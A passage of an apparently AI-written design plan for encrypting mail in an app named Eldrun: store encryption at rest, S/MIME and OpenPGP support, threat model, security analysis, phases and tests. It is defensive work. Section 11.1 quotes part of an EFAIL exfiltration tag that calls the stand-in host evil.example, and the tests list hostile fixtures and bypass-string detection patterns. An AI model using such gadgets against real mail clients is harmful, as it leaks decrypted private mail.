default, and the locked state has a designed, named, unlock-able UI rather than
being discovered as a bug.

**When the key is unavailable, exactly one behaviour per surface:**

| Surface | Behaviour |
|---|---|
| Reading local mail | **Refused, with an unlock affordance.** Never "empty mailbox" — that is the precise bug the keyring rules exist to prevent. |
| Sync / Check mail | **Refused**, same banner. (Considered and rejected: "sync into a memory-only store." It loses everything on quit, makes the unread counts lie, and re-downloads forever.) One state, one message, no half-mode. |
| `MailIndicator` (header badge) | The amber `!` it already carries for a failed check, with the locked-keyring wording in the tooltip. |
| Sending | Refused — the draft and its staged attachments are sealed. |

**Key lifetime in memory.** MK lives in a `Zeroizing<[u8; 32]>` inside
`MailRuntime` for the process lifetime (the existing session-password precedent),
zeroized on `RunEvent::Exit`. Dropping it when the overlay closes was considered
and rejected: `MailIndicator`'s 5-minute poll would re-prompt forever. **The
honest consequence: the "narrower window while suspended" benefit in §10.8 is
only partly realised** — once the mailbox has been opened in a session, the key
is in RAM until Eldrun exits. Saying otherwise would be the dishonest version of
this design.

### 10.7 The decrypted-body policy (the S/MIME interaction)

Three candidates for what happens to a message decrypted per §7:

- **(a) Never cache.** Re-decrypt on every view. Costs an RSA private-key
  operation per open, needs the identity unwrapped every time, and requires
  keeping the raw ciphertext locally (fine) — but makes the message permanently
  unsearchable and every re-read slow.
- **(b) Cache the sanitized plaintext, re-encrypted under the store key.** One
  plaintext copy exists, in RAM, for the length of the render. The disk holds
  ciphertext under a key the user controls. Search works (§10.5). Re-opening is
  instant.
- **(c) Memory-only with a TTL.** The complexity of both with the durability of
  neither.

**Recommend (b), made conditional and structural**, per §7.5's named invariant:
`bodies_cache` is written for a decrypted message **only when the store is
encrypted**. On a plaintext store, decrypted mail is never cached — which means
enabling S/MIME before §10 degrades gracefully to (a) rather than quietly writing
your decrypted mail into a plaintext SQLite file.

### 10.8 The threat model, honestly

**Defends against:** a stolen or lost laptop that is **powered off**; a disk
pulled from a machine; a **backup** (Time Machine, restic, a synced folder, a
cloud home directory) that captured `~/.local/share`; a decommissioned or resold
drive; another user, or another *process running as another user*, on a shared
machine.

**Does not defend against:** a running session with the mailbox unlocked (the key
is in memory by definition); malware running as the user, which can read the
process or simply wait for the unlock; root; a memory dump or swap; a
cold-boot-style attack on a **suspended** laptop.

**And the sentence plan B §5.2 was right about: on a full-disk-encrypted machine
that is powered off, FDE already covers every item in the first list.** So what
does app-level encryption actually add? Three things, and only these three:

1. **The backup case.** FDE protects the disk, not the backup. A user-level
   backup tool reads plaintext through the mounted filesystem and writes it
   wherever the backup goes, including a cloud target with a different threat
   model. An app-encrypted store is ciphertext in the backup.
2. **Shared and networked home directories.** `0600` stops a peer user; it does
   not stop root, and it does not stop a `$HOME` that is an NFS mount — which
   this project explicitly has, since HPC login nodes with shared home
   directories are a first-class supported target.
3. **Suspend rather than shutdown.** FDE keys live in RAM on a suspended laptop,
   which is the common laptop state. An app key can at least be *absent* before
   the first unlock of a session — partially, per §10.6's honest caveat.

That is a real argument, and it is why the answer changes from §5.2's "no" to
"yes, opt-in, done properly". It is not a reason to stop recommending FDE, and
the settings copy should keep saying so.

### 10.9 Attachments and temp files — the classic hole

Audited, one line per path:

| Path | Today | Under encryption |
|---|---|---|
| `mail_attachment_save` | backend raises the OS **save** dialog; user picks the destination | unchanged — this is the intended, explicit exit |
| `mail_attachment_preview` | returns **base64 over IPC**, no path, no temp file | unchanged, and this is already right |
| `mail_attach_pick` | **copies** the picked file into `outbox/<draft>/<staged>`, plaintext | sealed under the blob key like everything else — these are the attachments of an unsent message |
| inline (`cid:`) images | `data:` URIs in the srcdoc; no blob, no file | unchanged. Residual: WebKitGTK may spool a very large `data:` URI internally; there is no path we control, so it is disclosed rather than fixed |
| `tempfile` crate | a dependency (git host-vs-mirror diff staging) | **forbidden in every mail module**, enforced by a source-scanning tripwire beside the existing `no_command_takes_a_path` — the scan rejects `tempfile`, `NamedTempFile`, `std::env::temp_dir` and `TempDir` under `services/mail_*` and `commands/mail.rs` |
| **SQLite temporaries** | **unset — the real new leak** | `PRAGMA temp_store = MEMORY` in `MailStore::open`, so sorts, `VACUUM` and large joins never spill plaintext into `/tmp`. One line, invisible until someone looks in `/tmp`, and `VACUUM` during the §10.10 migration is exactly when it would spill |
| crash reporter (`commands/crash.rs`, `install_seh_filter`) | writes a `crash.log` line | audited to carry no mail state; add an assertion, because a future "include recent state" improvement is the obvious way this breaks |

### 10.10 Migration of an existing plaintext store

Mail shipped 2026-07-26, so stores exist. Enabling encryption is an explicit
action in Settings → Mail → Security, running in `spawn_blocking` with progress
on the existing `mail:sync` event shape (new `phase: "encrypting"`), and it is
**resumable** — a `meta.encryption_migration` cursor, so a kill mid-run resumes
rather than corrupting.

Order (each step is separately restartable):

1. Create `keyring.json` — generate MK, wrap it, write, `fsync`, `0600`.
2. Re-write every blob to its sealed form under the new HMAC-derived id; verify;
   then shred-and-unlink the original.
3. Per table, in batches inside a transaction, seal the columns in §10.4 and
   write a `*_enc` column; swap; drop the plaintext column.
4. Set `meta.encryption_version = 1`.
5. **Only then** dispose of the plaintext residue (below).

**Secure deletion is mostly a lie on modern storage, and the document says so
rather than implying otherwise.** On SSD/NVMe with wear levelling, and on any
copy-on-write filesystem (btrfs, ZFS, APFS), overwriting a file does not
overwrite the blocks that held it. What is done, and what it is actually worth:

- **Blobs:** overwrite with random bytes, `fsync`, unlink. Genuinely removes the
  data on plain ext4-on-HDD; best-effort elsewhere.
- **`mail.db`:** worse than it looks, because plaintext survives in *freed pages*
  and in the WAL. Sequence: `PRAGMA secure_delete = ON` before the migration's
  deletes → `VACUUM INTO 'mail.new.db'` (a **fresh file** containing only live,
  now-sealed data; plain in-place `VACUUM` rewrites within the same file and can
  leave old pages) → `fsync` → re-apply `journal_mode`/`foreign_keys`/`temp_store`
  on the new file → atomically replace → shred-and-unlink the old `mail.db`,
  `mail.db-wal` and `mail.db-shm`.
- **The honest sentence, shown in the UI:** *a store that was ever plaintext
  should be assumed recoverable from this disk.* Which is why the dialog offers
  **two** options and does not pretend the first is complete:
  1. *Encrypt the mail already stored here* — best effort, everything is kept.
  2. *Start a fresh encrypted store and delete the old one* — genuinely clean,
     and a real option precisely because **everything in this store is a cache**
     that the server can supply again.

**Turning encryption off is not offered.** There is no honest way to decrypt in
place without leaving plaintext behind, and the only person who would press the
button is someone who forgot their passphrase — for whom the correct action is
"delete the local store and re-sync", which already exists
(`clear_cached_mail` / `delete_account_mail`).

### 10.11 Should the identity store and the mail store share a key hierarchy?

**Share.** One MK, purpose-separated subkeys (§10.6).

- Two unlocks means two prompts and a guaranteed user workaround — the same
  passphrase typed twice, which is one secret with extra steps.
- Splitting buys a threat model nobody has. "The attacker obtained the mail field
  key but not the identity key" is not reachable: both are unwrapped in the same
  process, at the same moment, for the same reason.
- HKDF with distinct `info` strings already gives the property actually wanted —
  domain separation, so a bug that leaks the field key does not hand over the
  identity-wrapping key.

**One asymmetry that is a UX rule rather than a key-hierarchy rule, and it must
not be forgotten:** the mail store is a **cache** (deletable, re-syncable); a
private key is **irreplaceable** (losing it loses every message ever encrypted to
you). Hence §3.2's export path, offered at import time with that sentence
attached.

---

## 11. Security analysis

### 11.1 EFAIL, direct-exfiltration variant

The attack: take a captured ciphertext, wrap it in a `multipart/mixed` whose
first part opens `<img src="https://evil.example/?`, whose second is the
ciphertext, and whose third closes the tag — so the client decrypts, splices, and
fetches the plaintext to the attacker.

**Eldrun's existing posture defeats this three times over, and none of it was
built for crypto:**

1. The app CSP in `src-tauri/tauri.conf.json` has **no `https:` in any fetch
   directive**. The webview cannot make the request at all.
2. `mail_sanitize` strips **every** remote URL attribute and merely counts them
   (`remote_refs`).
3. The render frame is `<iframe sandbox="">` with its own inline `<meta>` CSP of
   `default-src 'none'; img-src data:`.

This is the strongest single argument for building S/MIME **here** rather than in
an ordinary mail client: the channel EFAIL needs was removed, for unrelated
reasons, before the crypto existed.

Three rules keep it that way:

- **The "Load remote content" opt-in (plan B §2.6, still unimplemented) must be
  permanently unavailable for any message that was decrypted or signed.** Put
  that in `mail_body`'s contract *now*, before the proxy exists, or it will be
  forgotten when the proxy is written.
- **At most one enveloped part per message** (§7.1). The gadget needs the client
  to concatenate several decryptions into one document.
- The decrypted tree goes through the **same** sanitizer, with no special case.

### 11.2 EFAIL, CBC-gadget variant

S/MIME's AES-CBC content encryption has **no integrity protection**, so an
attacker with a known plaintext prefix can splice chosen plaintext into the
decrypted output. Mitigations in order of strength:

1. **Render decrypted bodies as plain text by default.** `mail_crypto_render_html`
   defaults to **false**: a decrypted message's body is escaped and wrapped in
   `<pre class="mail-plain">` — the existing plain-text path — and HTML rendering
   for that message is available only behind an explicit per-message click. In a
   developer tool this costs almost nothing and it removes the gadget's entire
   payload surface. **This is the recommended primary defence and it is cheap.**
2. **Refuse to render a decryption whose result is not a well-formed MIME
   entity.** A gadget-modified body usually leaves structural garbage. Weak,
   free, and it composes.
3. **Show the cipher.** `content_alg` is on the wire (§7.3) precisely so the
   panel can say *"this message used an unauthenticated cipher"* for CBC. A fact
   the user can act on ("ask them to re-send") beats silence.
4. **Never show a partial decryption.** If unpadding fails, or the inner MIME
   parse fails, render nothing and say so — never the bytes that did decrypt.
5. Note honestly that `cbc`'s PKCS#7 unpadding is **not constant-time**; combined
   with §11.3's "no automatic decryption", the oracle has no automated query
   channel.

### 11.3 Decryption oracles

Any per-message signal an attacker can observe turns the client into a
Bleichenbacher/Marvin oracle against RSAES-PKCS1-v1_5 (§2.5). The rules:

- **Decryption happens only on an explicit user open.** Never during sync, never
  on the arrival poll, never to build a preview or a thread summary. This caps
  the attacker's query budget at "messages a human clicks" instead of "messages
  the attacker sends", and it is the rule that actually carries the defence given
  the unpatched `rsa` advisory.
- **Exactly one failure state crosses the IPC boundary**: `decryption_failed`.
  No distinction between bad padding, no matching recipient, unsupported
  algorithm or a malformed CMS structure reaches the wire. (The detailed reason
  goes to the local log only, and the log is not a remote channel.)
- **No automatic outbound anything.** MDN read receipts are permanently rejected
  (T19), `List-Unsubscribe-Post` is not implemented, revocation is not fetched
  (§4.4), remote content is blocked. There is no auto-reply of any kind to build
  an oracle out of.
- Timing: unavoidable at the crate level, bounded at the design level by the
  first rule.

### 11.4 UI signature spoofing

**Never render trust chrome from message-controlled content.** Concretely:

- `MailCryptoPanel` lives **outside** the iframe, above it, and is rendered
  entirely from the closed enums of `MailCryptoStatus`. The body cannot paint
  over it: `sandbox=""` gives an opaque origin with no scripts, `position` /
  `z-index` / `content` are **not** on `filter_style_properties`' allowlist, and
  the frame is a fixed box.
- The signer's `CN` and `rfc822Name` are **attacker-chosen text**. They go
  through `strip_controls` in the backend (bidi/format controls removed, the T7
  rule) and land in React as **plain text nodes** in a visually distinct weight —
  never `dangerouslySetInnerHTML`, which does not appear anywhere under
  `src/components/mail/` and is asserted by a source-scanning test.
- A signer name that itself looks like a verdict — `CN=✅ Verified` — is
  neutralised by *position*: the name is rendered inside a labelled field, never
  where the verdict is. That is a fixture (§14).
- **Green is a conjunction, computed in the frontend from three axes and never
  from one field**: `signature == valid && trust == trusted && from_match ==
  true`. `mailCryptoShown()` is the analogue of `mailAuthShown()` and refuses a
  second time on the frontend, for the same stated reason: *"a tick an attacker
  can draw is worse than no tick at all."*

### 11.5 Certificate substitution

- A changed certificate for a known correspondent is a **confirmation dialog**
  naming both fingerprints, not a silent update (§5.1).
- A recipient certificate is **never** selected by display name. Selection is by
  addr-spec, and the addr-spec must appear in the certificate's `rfc822Name` SAN.
- A harvested certificate is stored but never trusted; trust is recomputed on
  every use through `mail_trust` (the `apply_trust`-on-every-read precedent from
  `mail_authres`, which exists so that changing the trust configuration re-judges
  already-synced mail with no re-sync).

### 11.6 Everything message-derived is attacker-controlled

The project rule, applied to the new surfaces:

- A certificate that arrived in a message is **attacker-controlled data**. It may
  be parsed (bounded), never trusted, never written under a name it chose (peer
  certs are stored under the SHA-256 of their DER, not under a subject string),
  and never used to decide anything before chain validation.
- **Key-store poisoning through the import path**: the identity import is
  reachable **only** from Settings and **only** through the backend-raised OS
  open dialog. There is deliberately no "import this attachment as my identity"
  button — that would be a superb way to make someone decrypt with the attacker's
  key and sign with it.
- Every new command obeys the standing rule: **no `mail_*` command takes a
  filesystem path.** The `no_command_takes_a_path` `RESERVED` list gains `p12`,
  `pfx`, `key`, `keyfile`, `cert`, `certfile`, `crl`.

### 11.7 Structural caps

Restated because crypto adds new unbounded loops: `MAX_CRYPTO_DEPTH = 3`;
`MAX_DECRYPTED_BYTES = MAX_MESSAGE_BYTES`; at most one enveloped part per
message; `MAX_RECIPIENT_INFOS = 256` (a `RecipientInfos` with 100 000 entries is
100 000 attempted matches); `MAX_CERTS_IN_SIGNEDDATA = 64`;
`MAX_CHAIN_DEPTH = 8`; a wall-clock bound on the whole crypto pass in
`spawn_blocking`, matching `MAX_SANITIZE`.

### 11.8 Algorithm allowlists, not dispatch-on-what-the-message-says

An **allowlist of OIDs**, with anything else refused loudly and named:

| Refused | Why |
|---|---|
| RC2, DES, 3DES **for message content** | Broken / 64-bit block. (The same primitives are *accepted* for legacy `.p12` import — §3.1 — and the asymmetry is the point.) |
| MD5, SHA-1 **in a signature** | Collision-forgeable. (SHA-1 in a PKCS#12 MAC is unavoidable legacy and is fine: the passphrase is the security.) |
| RSA keys < 2048 bits | |
| Any content-encryption OID not on the list | Never "best effort" |
| `smime-type=compressed-data` | Decompression-bomb channel (T10) |
| `authEnveloped-data` | Cannot be represented by `cms 0.2.3` (§7.2) |
| Non-`emailProtection` EKU on a signer | §4.3 |

---

## 12. Secondary track: OpenPGP / PGP-MIME (RFC 3156)

### 12.1 What is shared

Almost everything, which is why this is a *track* rather than a second project:
`mail_crypt` (§10) unchanged; the identity-store *shape* (a keyring instead of a
certificate store) and its sealing; the MIME-detection seam in
`mail_engine::parse_message`; `MailCryptoStatus` and `MailCryptoPanel` (only the
*evidence* differs, not the outcomes); the compose toggles and the block-on-missing
rule; the decrypt → parse → sanitize ordering; the plain-text-by-default
rendering rule; the single failure state; every structural cap; encrypt-to-self;
encrypted drafts; and the entire test harness.

### 12.2 What changes

- **The crate does more, not less.** `pgp` (rPGP) 0.20, MIT/Apache-2.0, pure
  Rust, implements encrypt/decrypt/sign/verify **end to end** — unlike `cms`,
  which is types and builders only (§2.3). **The secondary track is therefore
  materially *less* implementation work than the primary one**, which is a
  surprising conclusion and should be stated rather than buried: if Phase 0 fails
  (§2.7), OpenPGP is the fallback that keeps a working end-to-end feature without
  OpenSSL. Add it as `pgp = { version = "0.20", default-features = false, … }` —
  the default features pull `bzip2`, a C dependency **and** a decompression-bomb
  channel, so dropping them serves both rules at once.
- **No chain, no CA, no revocation.** The Web of Trust is dead in practice; the
  deployed model is TOFU (Autocrypt, Delta Chat, Thunderbird's "accepted keys").
  Recommend **TOFU with an explicit first-contact confirmation** — the same
  dialog shape as §5.1's certificate-change confirmation and the existing SSH
  host-key confirmation. `MailTrustState` gains `tofu_new` / `tofu_known` /
  `tofu_changed`; the *outcome* enum is shared, only the evidence differs.
- **Key discovery**: **Autocrypt headers** (the sender's key rides an ordinary
  header on incoming mail — the direct analogue of certificate harvesting, and
  safe under TOFU rules) are the recommended default. **WKD** (an HTTPS fetch per
  correspondent) is a beacon and is deferred; if ever added it must be explicit
  and routed through `browser_engine`'s SSRF-guarded fetch. **Public keyservers
  are rejected** — a poisoning vector and a beacon in one.
- **MIME types**: `multipart/encrypted; protocol="application/pgp-encrypted"`
  with the `application/octet-stream` payload; `multipart/signed;
  protocol="application/pgp-signature"` with `micalg`. **Inline / clearsigned PGP
  is displayed as text and never interpreted** — a partially-signed inline body,
  where the signature covers only some of what the user reads, is a spoofing
  class of its own and there is no way to render it honestly.
- **EFAIL is historically worse for PGP** (the CFB gadget), and the fix is
  integrity protection. Rule: **refuse** a message with neither an MDC nor an
  AEAD-protected packet, rather than warning about it. rPGP surfaces the
  distinction.
- Encryption to a recipient whose key is expired or revoked is refused, not
  warned.

### 12.3 Sequencing

Phase 7, after the S/MIME phases — **unless** Phase 0 fails, in which case it
becomes Phase 2 and S/MIME is dropped or re-decided with the user (§16 q1).

---

## 13. Phased implementation

Each phase is independently shippable, independently testable, and leaves the app
in a coherent state if the next one never happens.

### Phase 0 — Prove the stack. No user-visible change.

A driver under `src-tauri/examples/smime_probe.rs` (the `examples/lockstep_drv.rs`
precedent) plus fixtures. Three exit criteria, all binary:

1. `rustls-webpki` validates a **real, issued personal certificate** to a real
   root with `KeyUsage::required(EMAIL_PROTECTION)` — the risk named in §2.4.
2. `mail_smime::verify_signed` verifies a detached signature produced by
   `openssl smime -sign` and by Thunderbird.
3. `mail_smime::open_enveloped` decrypts a message produced by
   `openssl smime -encrypt` for both an RSA and an ECC recipient.

**Failure branch, decided in advance:** go to §16 q1 — accept OpenSSL (§2.6), or
drop S/MIME and promote the OpenPGP track (§12).

*Files:* `src-tauri/examples/smime_probe.rs`,
`src-tauri/tests/fixtures/mail/smime/` (+ `make_fixtures.sh`).

### Phase 1 — Local store at rest (§10). Ships alone, needs nothing above.

*Backend:* **new** `services/mail_crypt.rs`; `services/mail_store.rs` (sealed
columns, `PRAGMA temp_store = MEMORY`, keyed blob ids, decrypt-on-scan search,
migration + `VACUUM INTO`); `commands/mail.rs` (`mail_store_unlock`,
`mail_store_set_passphrase`, `mail_store_encrypt_begin`, `mail_store_state`);
`schema/mail.rs` (`MailStoreState`); `schema/settings.rs`;
`services/remote_credentials.rs` (a `mail:store-key` account helper beside
`mail_account`); `Cargo.toml`.
*Frontend:* **new** `src/components/mail/MailUnlockDialog.tsx`;
`MailPane.tsx` (the locked state), `MailIndicator.tsx` (the locked tooltip),
`stores/mail.ts`, `lib/mail.ts`, `types/mail.ts`, `SettingsDialog` mail section,
`lib/i18n.ts` ×5.

### Phase 2 — Identity and certificate store (§3).

*Backend:* **new** `services/mail_certs.rs` (PKCS#12 in/out, the sealed key file,
peer + root + CRL stores); `commands/mail.rs` (`mail_identity_{import, list,
remove, export}`, `mail_peer_cert_{list, import, forget}`,
`mail_trust_root_import`, `mail_crl_import`); `schema/mail.rs` (`MailIdentity`,
`MailPeerCert`).
*Frontend:* **new** `MailIdentityDialog.tsx`; `MailAccountDialog.tsx` (the
Security section, §6.2); `types/mail.ts`; `lib/mail.ts`; i18n ×5.

### Phase 3 — Verify signed mail (§7, §4). **Zero new asymmetric crates, zero advisories.**

The highest value-per-risk phase: at a workplace the common case is *receiving*
signed mail. Needs no private key at all.

*Backend:* **new** `services/mail_smime.rs` (classify, `verify_signed`, the
`signedAttrs` re-tag, detached canonicalization); **new**
`services/mail_trust.rs` (anchors, `verify_for_usage`, `rfc822_matches`);
`services/mail_engine.rs` (the classify seam, `MAX_CRYPTO_DEPTH`);
`commands/mail.rs` (`MailBody.crypto`); `schema/mail.rs` (`MailCryptoStatus` &c.).
*Frontend:* `MailMessageView.tsx` (`MailCryptoPanel`), `lib/mail.ts`
(`mailCryptoShown`/`mailCryptoTone`/`mailCryptoSummary`), `types/mail.ts`,
`MailList.tsx` (the row glyph), i18n ×5.

### Phase 4 — Decrypt (§7). Needs Phase 2's key; adds `rsa` under §11.3.

*Backend:* `services/mail_smime.rs` (`open_enveloped`, `ktri`/`kari`);
`services/mail_engine.rs` (re-entry with depth); `commands/mail.rs` (the §7.5
cache invariant, decrypt-only-on-open); `Cargo.toml` (`rsa`, `p256`, `p384`,
`aes-kw`, `ansi-x963-kdf`, `aes`, `cbc`).
*Frontend:* `MailMessageView.tsx` (plain-text-by-default + the per-message
"Show HTML" click), `MailList.tsx` (the lock glyph and the fixed preview literal).

### Phase 5 — Sign and encrypt on send (§8).

*Backend:* `services/mail_smime.rs` (`sign`, `envelop`); `commands/mail.rs`
(`mail_draft_send` wrapping, `mail_recipient_cert_state`); `schema/mail.rs`
(`MailDraft.sign` / `.encrypt`).
*Frontend:* `MailComposeDialog.tsx` (toggles, recipient chips, blocked Send).

### Phase 6 — Sent copies via IMAP `APPEND` (§8.5). Deliberately after Phase 5.

*Backend:* `services/mail_engine.rs` (an `append` method on `MailEngine` — the
first one; the trait is the seam plan A's helper-process move depends on, so it
grows rather than being bypassed); `commands/mail.rs`.

### Phase 7 — OpenPGP / PGP-MIME (§12).

*Backend:* **new** `services/mail_pgp.rs`; `mail_certs.rs` (a keyring beside the
cert store); the classify seam; `Cargo.toml` (`pgp`, no default features).
*Frontend:* mostly none — the panel, the toggles and the store are shared.

### Phase 8 — Deferred, listed so "deferred" is a plan.

Explicit revocation checks over the hardened fetch; CRL auto-refresh on a
schedule; LDAP lookup (§5.2, generic only); protected headers on send;
`AuthEnvelopedData` if `cms` gains the type.

---

## 14. Test strategy

Gates: **`npx tsc --noEmit`** and **`cargo test --manifest-path
src-tauri/Cargo.toml`**. Vitest is expected to pass but is not a gate, per the
standing project constraint.

### 14.1 Fixtures

`src-tauri/tests/fixtures/mail/smime/`, generated by a **checked-in
`make_fixtures.sh` that shells out to `openssl`** — the same pattern as
`hostile_kitchen_sink.gen.py`. This is worth stating explicitly because it looks
like a contradiction and is not: **OpenSSL as a fixture-generation tool on a
developer's machine is not OpenSSL in the shipped bundle**, and it is what makes
independent-implementation testing possible at all. The generated `.eml` files
are committed; the script is committed; neither is a build dependency.

All domains are `example.com` / `example.org` / `evil.example`. No institution
hostname, no real certificate, no real address, anywhere.

### 14.2 Rust

`services::mail_crypt` — envelope round-trip; **AAD binding (a sealed value moved
to another row/column/account fails to open)**; version-byte rejection; a flipped
tag byte returns `Err` and never panics; Argon2 parameters round-trip through
`keyring.json`; a wrong passphrase is caught by the check value; `Debug` on every
key type prints no bytes.

`services::mail_store` (encryption on) — every read path; page/sort/count parity
with the plaintext store; migration **idempotence** and **resumability** (kill
mid-run, re-run, complete); `secure_delete` + `VACUUM INTO` leaves no plaintext
in the new file (grep the bytes); `temp_store = MEMORY` is set; `bodies_cache` is
**not** written for a decrypted message when `encryption_version == 0` (the §7.5
invariant, as a test rather than a comment).

`services::mail_smime` — valid detached; valid opaque; enveloped RSA-PKCS1;
enveloped RSA-OAEP; enveloped ECDH-P256; AES-128-CBC and AES-256-CBC; expired
signer; wrong-CA signer; **signer whose `rfc822Name` ≠ `From`**; a signature over
a *different* body (cut-and-paste); **a `multipart/mixed` where only one part is
signed → `partial`, never `valid`**; encrypt-then-sign → `outside_encryption`;
triple-wrap → parsed to depth 3; `certs-only` → surfaced, not imported;
`compressed-data` → refused; `authEnveloped-data` → refused with a named reason;
500-deep nesting → refused; two enveloped parts → refused; a `RecipientInfos`
with 100 000 entries → refused; a `.p12` with legacy RC2/3DES **and** one with
PBES2/AES, both loading; a `.p12` with a bad MAC → refused.

`services::mail_trust` — `rfc822_matches` as an exhaustive table (case folding on
the domain but not the local part, IDNA, multiple SANs, the legacy
`emailAddress` RDN, an empty SAN, a wildcard, a NUL-embedded name); EKU absent →
refused; `basicConstraints` missing on an intermediate → refused; expired
intermediate → refused; revoked-by-imported-CRL → `revoked`; no CRL held →
`not_checked` and **never** `ok`.

`tests/mail_hostile_crypto.rs` — the sibling of `tests/mail_hostile_message.rs`:
one message that (a) claims `Content-Type: multipart/signed` with no signature,
(b) carries a self-signed certificate with `CN=Your Bank Security Team`, (c)
wraps a real ciphertext in an EFAIL direct-exfiltration gadget, (d) sets a signer
`CN` full of bidi controls and markup, (e) forges an all-pass
`Authentication-Results` on top for good measure. Asserted: never `valid`, never
`trusted`, no remote reference survives, controls are stripped, and the whole
thing renders inert.

**Tripwires** (source-scanning, the existing pattern in `commands/mail.rs`'s
tests):
no mail module references `tempfile`/`NamedTempFile`/`temp_dir`/`TempDir`;
`no_command_takes_a_path`'s `RESERVED` gains the certificate words;
**no certificate-validation bypass string** (`danger_`, `insecure`,
`skip_verify`, `verify_none`, `accept_invalid`) appears anywhere under the mail
modules — the mirror of `mail_engine.rs`'s existing TLS-bypass scan;
no second keychain path;
`MailCryptoStatus`'s enums serialize to the frozen lowercase tokens
(`schema::mail`'s existing enum test, extended).

### 14.3 Frontend (vitest)

`MailCryptoDisplay.test.ts` — the analogue of `MailAuthDisplay.test.ts`. Green
**only** on `valid ∧ trusted ∧ from_match`; every other combination names the
failing axis; an unknown token never inherits a good tone; `not_checked`
revocation never reads as checked.

`MailCryptoSpoof.test.ts` — a signer `CN` of `"✅ Verified by Eldrun"`, one with
an RLO override, one containing `<b>` markup: each renders as text, inside the
labelled field, never in the verdict position, never through
`dangerouslySetInnerHTML`.

`MailUnlock.test.tsx` — a locked keyring renders "unlock", not "empty"; the
remember flag sends `true | null` and **never** `false`; a failed keychain write
surfaces.

`MailTripwire.test.ts` extended — no `dangerouslySetInnerHTML` under
`src/components/mail/`; every `mail_*` invoke goes through `lib/mail.ts`; the
crypto status tokens in `types/mail.ts` match the Rust enums (read out of the
Rust source, the `REASON_TOKENS` precedent).

### 14.4 Manual QA only — **the user must do all of this; I cannot launch Eldrun**

- Import a real work `.p12` (both a modern and a legacy export) and read a real
  signed message from a real colleague.
- **Interop gate, explicit and blocking.** Before Phase 5 ships, a matrix against
  **Thunderbird** and **Outlook**, both directions × {signed, encrypted,
  signed+encrypted} × {with attachment, without} × {RSA identity, ECC identity},
  plus Apple Mail where available. Nothing in Phase 5 ships until a message sent
  from Eldrun verifies green in Outlook *and* in Thunderbird, and the reverse
  direction reads clean here. **This cannot be unit-tested and it is the only
  evidence that matters** — every fixture in §14.1 was generated by the same
  OpenSSL that would share our misreading of the spec.
- Locked-keyring behaviour against a **real** Secret Service: lock the
  collection, open mail, confirm the unlock banner appears and that no data is
  lost or "forgotten".
- Passphrase-unlock latency on a real mailbox — Argon2id parameters versus human
  patience; tune and record the chosen parameters.
- The §10.10 migration on a real, large, existing store; watch `/tmp` stay empty
  throughout (the `temp_store` check).
- Search latency on the largest available folder after §10.5's decrypt-on-scan.
- Confirm the EFAIL fixture renders with no network activity, observed from
  outside the app.

Per `feedback_untested_tag`, **every new surface ships with `<UntestedTag />`**
and each is removed only when the user says that item is tested:
`MailCryptoPanel`'s head, `MailIdentityDialog`'s title, `MailUnlockDialog`'s
title, `MailAccountDialog`'s Security-section head, and the compose Sign/Encrypt
strip.

---

## 15. TODO entries

Group **J** (Web & Mail Surfaces) owns mail, so these are J items in the repo's
existing `NN`/`NNx` style, each with the two verification checkboxes. Group J's
row in `TODO.md` gains: *"…plus **mail encryption** (65a–65i): local store at
rest, then S/MIME, then OpenPGP — plan: `docs/mail_encryption_plan_b.md`."*

```markdown
65a. **Mail store encryption at rest.** (Phase 1 — ships alone, blocks 65d/65e.)
     Field-level XChaCha20-Poly1305 inside `mail.db` + whole-file AEAD for
     `blobs/`/`outbox/`, one Argon2id-or-keychain-unlocked key hierarchy,
     AAD-bound so a ciphertext cannot be moved between rows. Plaintext columns
     (date/uid/flags/size) are deliberate and the metadata leak is documented.
     Includes `PRAGMA temp_store = MEMORY`, keyed blob ids, decrypt-on-scan
     search, and a resumable migration with `VACUUM INTO` + shred. Locked-key
     state renders as *unlock*, never as an empty mailbox.
     Plan: `docs/mail_encryption_plan_b.md` §10.
     - [ ] 🤖 Automated test — AAD binding, migration resumability, the
           "no plaintext body cache on an unencrypted store" invariant.
     - [ ] 🖐️ Manual test — migrate a real store; lock the keyring mid-session.

65b. **S/MIME stack spike.** (Phase 0 — gates everything below.) Prove
     `rustls-webpki` validates real issued personal certificates with
     `KeyUsage::required(emailProtection)`, and that our CMS verify/decrypt glue
     reads `openssl smime` and Thunderbird output. Failure branch is decided in
     advance: accept OpenSSL, or drop S/MIME for OpenPGP (§16 q1).
     - [ ] 🤖 Automated test — the probe *is* the test.
     - [ ] 🖐️ Manual test — a real work certificate, not a generated one.

65c. **Certificate & identity store.** (Phase 2.) PKCS#12 import (modern PBES2
     and legacy RC2/3DES), private key sealed under the 65a hierarchy, export
     back out, peer/root/CRL stores, `MailIdentityDialog`. No path ever crosses
     IPC; no OS certificate store is read for identities, and §3.3 says why.
     - [ ] 🤖 Automated test  - [ ] 🖐️ Manual test

65d. **Verify signed mail.** (Phase 3 — no private key, no new asymmetric crate,
     no open advisory.) `multipart/signed` + opaque `signed-data`, the
     `signedAttrs` re-tag, detached canonicalization, chain + EKU + rfc822-vs-From
     through webpki, and `MailCryptoPanel`. Green requires all three axes; a
     partially-signed message is `partial`, never `valid`.
     - [ ] 🤖 Automated test  - [ ] 🖐️ Manual test

65e. **Decrypt enveloped mail.** (Phase 4.) `ktri` (RSA) and `kari` (ECDH),
     AES-CBC content, depth caps, one-envelope-per-message, decrypt **only on an
     explicit open**, one failure state on the wire, plain-text rendering by
     default. Adds `rsa` under RUSTSEC-2023-0071 with the structural mitigations
     of §11.3 — see §16 q10 before starting.
     - [ ] 🤖 Automated test  - [ ] 🖐️ Manual test

65f. **Sign & encrypt on send.** (Phase 5.) Compose toggles, per-recipient
     certificate chips, **block** (never downgrade) on a missing certificate,
     sign-then-encrypt only, encrypted drafts. **Blocked on the Thunderbird +
     Outlook interop matrix** (§14.4) — that gate is manual and is the only
     evidence that counts.
     - [ ] 🤖 Automated test  - [ ] 🖐️ Manual test

65g. **Sent copies (IMAP APPEND).** (Phase 6 — after 65f, never before.) There is
     no APPEND in the codebase today, so there is currently no Sent copy at all.
     When added: encrypt-to-self is mandatory, and an account with no identity
     stores **no** Sent copy rather than a plaintext one.
     - [ ] 🤖 Automated test  - [ ] 🖐️ Manual test

65h. **OpenPGP / PGP-MIME.** (Phase 7, or Phase 2 if 65b fails.) rPGP with
     default features off (drops the bzip2 C dependency and a bomb channel),
     TOFU + first-contact confirmation, Autocrypt harvesting. **No keyservers, no
     WKD in v1.** Refuse a message with no MDC/AEAD rather than warning.
     - [ ] 🤖 Automated test  - [ ] 🖐️ Manual test

65i. **Revocation & directory lookup.** (Phase 8, deferred.) Explicit,
